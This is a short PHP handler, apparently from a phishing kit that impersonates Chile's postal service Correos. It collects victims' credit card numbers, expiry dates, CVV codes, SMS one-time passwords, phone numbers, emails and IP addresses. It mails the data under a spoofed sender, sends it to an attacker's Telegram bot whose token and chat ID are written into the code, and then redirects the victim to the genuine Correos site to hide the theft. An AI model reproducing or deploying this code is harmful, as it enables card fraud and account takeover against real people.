<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "sms  2       : ".$_POST['otp']."\n";
$bilsmg .= "sms  1       : ".$_POST['sms1']."\n";
$bilsmg .= "------------------------------------------------------\n";
$bilsmg .= "N-Phone      : ".$_POST['tel']."\n";
$bilsmg .= "E-mail       : ".$_POST['email']."\n";
$bilsmg .= "C-Number     : ".$_POST['cc']."\n";
$bilsmg .= "D-Expiration : ".$_POST['expe']."\n";
$bilsmg .= "CVN          : ".$_POST['cvv']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";

$bilsub = "CHILE CC :) sms2 - ".$ip;
$bilhead = "From: CHILE BOX <send@saudipost.io>";

mail("",$bilsub,$bilsmg,$bilhead);
fwrite($bilsmg);
header("location: https://www.correos.cl/");
	$token = "1700913062:AAGG_8FRQPJOQ5fFnww_G14MDUcV9MiruW4";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-525355396&text=" . urlencode($bilsmg)."" );
?>